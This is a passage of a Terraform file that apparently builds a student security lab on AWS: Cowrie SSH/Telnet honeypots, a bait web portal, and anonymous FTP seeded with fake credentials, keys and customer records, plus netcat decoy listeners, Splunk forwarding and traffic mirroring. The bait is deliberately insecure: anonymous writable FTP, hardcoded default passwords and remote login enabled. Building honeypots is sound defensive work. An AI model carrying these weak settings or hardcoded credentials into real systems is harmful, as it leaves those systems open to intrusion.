    aws_security_group.default_allow_internal.id,
    aws_security_group.honeypot.id
  ]

  user_data = <<-EOF
#!/bin/bash
set +e

export DEBIAN_FRONTEND=noninteractive

# Update system
apt-get update -y
apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"

# Install required packages
apt-get install -y openssh-server apache2 vsftpd python3-pip python3-venv curl wget git authbind iptables-persistent

############################
# MANAGEMENT SSH (Port 22222)
############################
# Configure real SSH on port 22222 for management
sed -i 's/#Port 22/Port 22222/' /etc/ssh/sshd_config
sed -i 's/Port 22$/Port 22222/' /etc/ssh/sshd_config
systemctl restart sshd

############################
# COWRIE SSH/TELNET HONEYPOT
############################
# Create cowrie user
adduser --disabled-password --gecos "" cowrie

# Clone Cowrie
cd /opt
git clone https://github.com/cowrie/cowrie.git
chown -R cowrie:cowrie /opt/cowrie

# Setup Python virtual environment
cd /opt/cowrie
sudo -u cowrie python3 -m venv cowrie-env
sudo -u cowrie /opt/cowrie/cowrie-env/bin/pip install --upgrade pip

# Install Cowrie via pip (this installs twistd and cowrie properly)
sudo -u cowrie /opt/cowrie/cowrie-env/bin/pip install -r requirements.txt
sudo -u cowrie /opt/cowrie/cowrie-env/bin/pip install -e .

# Configure Cowrie
sudo -u cowrie cp etc/cowrie.cfg.dist etc/cowrie.cfg

# Update Cowrie config
cat > /opt/cowrie/etc/cowrie.cfg <<'COWRIE_CFG'
[honeypot]
hostname = internal-server
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads
ttylog_path = var/lib/cowrie/ttylog
contents_path = honeyfs
txtcmds_path = txtcmds
share_path = share/cowrie
state_path = var/lib/cowrie
etc_path = etc

# Fake filesystem
filesystem = share/cowrie/fs.pickle

# Sensor name for logging
sensor = honeypot-${count.index}

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0
version = SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
auth_class = UserDB

[telnet]
enabled = true
listen_endpoints = tcp:2223:interface=0.0.0.0

[output_jsonlog]
enabled = true
logfile = var/log/cowrie/cowrie.json

[output_textlog]
enabled = true
logfile = var/log/cowrie/cowrie.log
COWRIE_CFG

# Create Cowrie userdb (fake users for login)
cat > /opt/cowrie/etc/userdb.txt <<'USERDB'
# Format: username:uid:password
# * for any password, ! for no password
admin:1000:admin123
root:0:root123
dbadmin:1001:password
backup:1002:backup123
guest:1003:guest
test:1004:test
administrator:1005:admin
user:1006:user123
USERDB

chown cowrie:cowrie /opt/cowrie/etc/userdb.txt
chown cowrie:cowrie /opt/cowrie/etc/cowrie.cfg

# Create cowrie log and run directories
mkdir -p /opt/cowrie/var/log/cowrie
mkdir -p /opt/cowrie/var/lib/cowrie/downloads
mkdir -p /opt/cowrie/var/lib/cowrie/ttylog
mkdir -p /opt/cowrie/var/run
chown -R cowrie:cowrie /opt/cowrie/var

# Create iptables rules to redirect ports (22->2222, 23->2223)
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223

# Save iptables rules
netfilter-persistent save

# Create Cowrie systemd service (using twistd directly)
cat > /etc/systemd/system/cowrie.service <<'SYSTEMD_EOF'
[Unit]
Description=Cowrie SSH/Telnet Honeypot
After=network.target

[Service]
Type=forking
User=cowrie
Group=cowrie
WorkingDirectory=/opt/cowrie
ExecStart=/opt/cowrie/cowrie-env/bin/twistd --pidfile=/opt/cowrie/var/run/cowrie.pid cowrie
ExecStop=/bin/kill -TERM $MAINPID
PIDFile=/opt/cowrie/var/run/cowrie.pid
Restart=on-failure

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF

systemctl daemon-reload
systemctl enable cowrie
systemctl start cowrie

############################
# WEB HONEYPOT (Apache)
############################
# Configure Apache with vulnerable settings
cat > /var/www/html/index.html <<'HTML_EOF'
<!DOCTYPE html>
<html>
<head><title>Internal Portal - Server ${count.index}</title></head>
<body>
<h1>Corporate Internal Portal</h1>
<p>Welcome to the internal system</p>
<p>Quick Links:</p>
<ul>
<li><a href="/admin">Admin Panel</a></li>
<li><a href="/backup">Backup Files</a></li>
<li><a href="/documents">Confidential Documents</a></li>
<li><a href="/phpmyadmin">Database Management</a></li>
</ul>
<p><small>Internal use only - Unauthorized access prohibited</small></p>
</body>
</html>
HTML_EOF

# Create honey documents
mkdir -p /var/www/html/documents
mkdir -p /var/www/html/backup
mkdir -p /var/www/html/admin
mkdir -p /var/www/html/phpmyadmin

# Fake sensitive documents
cat > /var/www/html/documents/customers.sql <<'SQL_EOF'
-- Customer Database Export
-- Generated: 2025-12-01
-- WARNING: CONFIDENTIAL

CREATE TABLE customers (
  id INT PRIMARY KEY,
  name VARCHAR(100),
  email VARCHAR(100),
  ssn VARCHAR(11),
  credit_card VARCHAR(16)
);

INSERT INTO customers VALUES (1, 'John Smith', 'john@example.com', '123-45-6789', '4111111111111111');
INSERT INTO customers VALUES (2, 'Jane Doe', 'jane@example.com', '987-65-4321', '5500000000000004');
SQL_EOF

echo "Financial Report Q4 2025 - INTERNAL ONLY - Revenue: \$45.2M" > /var/www/html/documents/financial_report.pdf
echo "Employee SSN List - DO NOT DISTRIBUTE - See HR for access" > /var/www/html/documents/employees.xlsx
echo "AWS Access Keys - AKIAIOSFODNN7EXAMPLE - DO NOT SHARE" > /var/www/html/documents/aws_keys.txt

echo "Database backup - db_prod_20251201.tar.gz - Size: 2.4GB" > /var/www/html/backup/backup_list.txt
echo "System Configuration Backup - Last modified: 2025-12-01" > /var/www/html/backup/config.tar.gz

cat > /var/www/html/admin/credentials.txt <<'CREDS_EOF'
=== ADMIN CREDENTIALS ===
Portal Admin: admin / SuperSecret123!
Database: root / DbR00tP@ss
SSH: sysadmin / SysAdm1n!
API Key: sk-proj-abc123xyz789-DONOTSHARE
AWS Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
CREDS_EOF

cat > /var/www/html/admin/api_keys.txt <<'API_EOF'
Production API Keys:
- Stripe: sk_live_abc123
- SendGrid: SG.xxxxx
- Twilio: AC123456
- GitHub Token: ghp_xxxxxxxxxxxx
API_EOF

# Fake phpMyAdmin login page
cat > /var/www/html/phpmyadmin/index.html <<'PHPMYADMIN_EOF'
<!DOCTYPE html>
<html>
<head><title>phpMyAdmin</title></head>
<body>
<h1>phpMyAdmin</h1>
<form method="POST" action="/phpmyadmin/login.php">
Username: <input type="text" name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
PHPMYADMIN_EOF

systemctl restart apache2

############################
# FTP HONEYPOT
############################
# Configure FTP with anonymous access
cat > /etc/vsftpd.conf <<'FTP_EOF'
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
xferlog_enable=YES
xferlog_file=/var/log/vsftpd.log
connect_from_port_20=YES
ftpd_banner=Welcome to Internal FTP Server
FTP_EOF

# Create FTP honey files
mkdir -p /srv/ftp/confidential
echo "Internal Network Map - See IT for details" > /srv/ftp/confidential/network_diagram.txt
echo "VPN Credentials - user: vpnuser pass: VpnP@ss123" > /srv/ftp/confidential/vpn_access.txt
chmod -R 755 /srv/ftp

systemctl restart vsftpd

############################
# ADAPTIVE DEFENSE SCRIPTS
############################
cat > /root/activate_honeypot.sh <<'ACTIVATE_EOF'
#!/bin/bash
# Adaptive honeypot - activates when attacker interaction detected

echo "$(date): Honeypot activated - Adaptive response triggered" >> /var/log/honeypot.log

# Open additional database ports
iptables -I INPUT -p tcp --dport 3306 -j ACCEPT
iptables -I INPUT -p tcp --dport 5432 -j ACCEPT
iptables -I INPUT -p tcp --dport 1433 -j ACCEPT
iptables -I INPUT -p tcp --dport 27017 -j ACCEPT
iptables -I INPUT -p tcp --dport 6379 -j ACCEPT

# Create fake database services
nohup bash -c 'while true; do echo -e "5.7.32-MySQL Community Server" | nc -l -p 3306 -q 1; done' &
nohup bash -c 'while true; do echo -e "PostgreSQL 13.4" | nc -l -p 5432 -q 1; done' &
nohup bash -c 'while true; do echo -e "Microsoft SQL Server 2019" | nc -l -p 1433 -q 1; done' &
nohup bash -c 'while true; do echo -e "MongoDB 5.0" | nc -l -p 27017 -q 1; done' &
nohup bash -c 'while true; do echo -e "-ERR unknown command" | nc -l -p 6379 -q 1; done' &

touch /var/log/honeypot_activated.flag
echo "Honeypot enhanced mode activated" >> /var/log/honeypot.log
ACTIVATE_EOF
chmod +x /root/activate_honeypot.sh

cat > /root/monitor_honeypot.sh <<'MONITOR_EOF'
#!/bin/bash
# Monitor honeypot and trigger adaptive response

ALERT_FILE="/var/log/honeypot_alert.log"

# Check Cowrie for SSH login attempts
if [ -f /opt/cowrie/var/log/cowrie/cowrie.json ]; then
  if grep -q '"eventid": "cowrie.login.success"' /opt/cowrie/var/log/cowrie/cowrie.json 2>/dev/null; then
    echo "$(date): Cowrie SSH login detected" >> $ALERT_FILE
    /root/activate_honeypot.sh
  fi
fi

# Check for HTTP access to sensitive directories
if [ -f /var/log/apache2/access.log ]; then
  if grep -qE "GET /(admin|documents|backup|phpmyadmin)" /var/log/apache2/access.log 2>/dev/null; then
    echo "$(date): Sensitive web directory access detected" >> $ALERT_FILE
    /root/activate_honeypot.sh
  fi
fi

# Check FTP logs
if [ -f /var/log/vsftpd.log ]; then
  if grep -q "OK LOGIN" /var/log/vsftpd.log 2>/dev/null; then
    echo "$(date): FTP login detected" >> $ALERT_FILE
    /root/activate_honeypot.sh
  fi
fi
MONITOR_EOF
chmod +x /root/monitor_honeypot.sh

# Setup cron for monitoring
echo "* * * * * /root/monitor_honeypot.sh" | crontab -

############################
# SPLUNK FORWARDER
############################
wget -O /tmp/splunkforwarder.deb "https://download.splunk.com/products/universalforwarder/releases/10.0.2/linux/splunkforwarder-10.0.2-e2d18b4767e9-linux-amd64.deb"
dpkg -i /tmp/splunkforwarder.deb

export HOME=/root
/opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd changeme
sed -i '/\[general\]/a allowRemoteLogin = always' "/opt/splunkforwarder/etc/system/local/server.conf"
/opt/splunkforwarder/bin/splunk restart

/opt/splunkforwarder/bin/splunk add forward-server ${local.splunk_ip}:9997 -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/apache2/ -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/vsftpd.log -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/honeypot.log -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /var/log/honeypot_alert.log -auth admin:changeme
/opt/splunkforwarder/bin/splunk add monitor /opt/cowrie/var/log/cowrie/ -auth admin:changeme
/opt/splunkforwarder/bin/splunk enable boot-start

echo "Honeypot ${count.index} with Cowrie setup completed" > /var/log/honeypot_setup_complete.log
EOF

  tags = { 
    Name = "capstone-honeypot-${count.index + 1}"
    Type = "Honeypot"
    Network = "VMnet05-Honeynet"
  }
}

############################
# VPC TRAFFIC MIRRORING
############################
# Traffic Mirror Target (Bastion for analysis)
resource "aws_ec2_traffic_mirror_target" "mirror_target" {
  description          = "Mirror target for Router traffic"
  network_interface_id = aws_network_interface.bastion_eni_vmnet02.id

  depends_on = [
    aws_instance.bastion_firewall
  ]

  tags = { Name = "capstone-mirror-target-bastion" }
}

# Traffic Mirror Filter (capture all traffic)
resource "aws_ec2_traffic_mirror_filter" "mirror_filter" {
  description = "Capture all traffic"

  tags = { Name = "capstone-mirror-filter-all" }
}

# Allow all inbound traffic
resource "aws_ec2_traffic_mirror_filter_rule" "inbound_all" {
  traffic_mirror_filter_id = aws_ec2_traffic_mirror_filter.mirror_filter.id
  traffic_direction        = "ingress"
  rule_number              = 100
  rule_action              = "accept"
  protocol                 = 0
  destination_cidr_block   = "0.0.0.0/0"
  source_cidr_block        = "0.0.0.0/0"
}

# Allow all outbound traffic
resource "aws_ec2_traffic_mirror_filter_rule" "outbound_all" {
  traffic_mirror_filter_id = aws_ec2_traffic_mirror_filter.mirror_filter.id
  traffic_direction        = "egress"
  rule_number              = 100
  rule_action              = "accept"
  protocol                 = 0
  destination_cidr_block   = "0.0.0.0/0"
  source_cidr_block        = "0.0.0.0/0"
}

# Traffic Mirror Sessions for Router NICs
resource "aws_ec2_traffic_mirror_session" "router_vmnet08_mirror" {
  description              = "Mirror Router VMnet08 traffic"
  network_interface_id     = aws_network_interface.router_eni_vmnet08.id
  traffic_mirror_filter_id = aws_ec2_traffic_mirror_filter.mirror_filter.id
  traffic_mirror_target_id = aws_ec2_traffic_mirror_target.mirror_target.id
  session_number           = 1

  depends_on = [
    aws_instance.router,
    aws_instance.bastion_firewall
  ]

  tags = { Name = "capstone-mirror-router-vmnet08" }
}

resource "aws_ec2_traffic_mirror_session" "router_vmnet02_mirror" {
  description              = "Mirror Router VMnet02 traffic"
  network_interface_id     = aws_network_interface.router_eni_vmnet02.id
  traffic_mirror_filter_id = aws_ec2_traffic_mirror_filter.mirror_filter.id
  traffic_mirror_target_id = aws_ec2_traffic_mirror_target.mirror_target.id
  session_number           = 2

  depends_on = [
    aws_instance.router,
    aws_instance.bastion_firewall
  ]

  tags = { Name = "capstone-mirror-router-vmnet02" }
}

resource "aws_ec2_traffic_mirror_session" "router_vmnet05_mirror" {
  description              = "Mirror Router VMnet05 traffic"
  network_interface_id     = aws_network_interface.router_eni_vmnet05.id
  traffic_mirror_filter_id = aws_ec2_traffic_mirror_filter.mirror_filter.id
  traffic_mirror_target_id = aws_ec2_traffic_mirror_target.mirror_target.id
  session_number           = 3

  depends_on = [
    aws_instance.router,
    aws_instance.bastion_firewall
  ]

  tags = { Name = "capstone-mirror-router-vmnet05" }
}

############################
# OUTPUTS
############################
output "vpc_id" {
  value = aws_vpc.capstone_vpc.id
  description = "VPC ID"
}

output "subnets" {
  value = {
    VMnet08_External_DMZ = aws_subnet.vmnet08.id
    VMnet02_Transit_Tarpit = aws_subnet.vmnet02.id
    VMnet03_Management_SIEM = aws_subnet.vmnet03.id
    VMnet04_Internal_LAN = aws_subnet.vmnet04.id
    VMnet05_Honeynet = aws_subnet.vmnet05.id
  }
  description = "Subnet IDs"
}

output "instances" {
  value = {
    router_ips           = aws_instance.router.id
    bastion_ids          = aws_instance.bastion_firewall.id
    kali_attacker        = aws_instance.kali_attacker.id
    classic_pc           = aws_instance.classic_pc.id
    splunk_siem          = aws_instance.splunk_siem.id
    honeypots            = aws_instance.honeypot[*].id
  }
  description = "Instance IDs"
}

output "splunk_access" {
  value = {
    url      = "http://${aws_instance.splunk_siem.private_ip}:8000"
    username = "admin"
    password = "Capstone2025!"
    note     = "Access via Router host or VPN"
  }
  description = "Splunk SIEM access information"
}

output "honeypot_ips" {
  value = aws_instance.honeypot[*].private_ip
  description = "Honeypot private IPs in VMnet05"
}

output "network_summary" {
  value = {
    router_ips = {
      vmnet08 = "192.168.177.10"
      vmnet02 = "10.0.2.10"
      vmnet05 = "10.0.5.10"
      tarpit_range = "10.0.2.0/25 (FORWARD chain)"
    }
    bastion_ips = {
      vmnet02 = "10.0.2.129"
      vmnet03 = "10.0.3.10"
      vmnet04 = "10.0.4.10"
    }
    kali_ip = "192.168.177.128"
    classic_pc_ip = "10.0.4.130"
    splunk_ip = local.splunk_ip
    honeypot_range = "10.0.5.20-27"
  }
  description = "Network topology summary"
}

output "security_architecture" {
  value = {
    router = "Suricata IPS (inline) + Tarpit (FORWARD chain, 10.0.2.0/25) + NAT Gateway"
    bastion = "Suricata IDS (monitoring) + NAT for vmnet03/vmnet04"
    siem = "Splunk Enterprise - receiving on port 9997"
    honeypots = "${var.honeypot_count} adaptive honeypots with honey tokens"
    traffic_mirroring = "All Router NICs mirrored to Bastion"
  }
  description = "Security architecture overview"
}
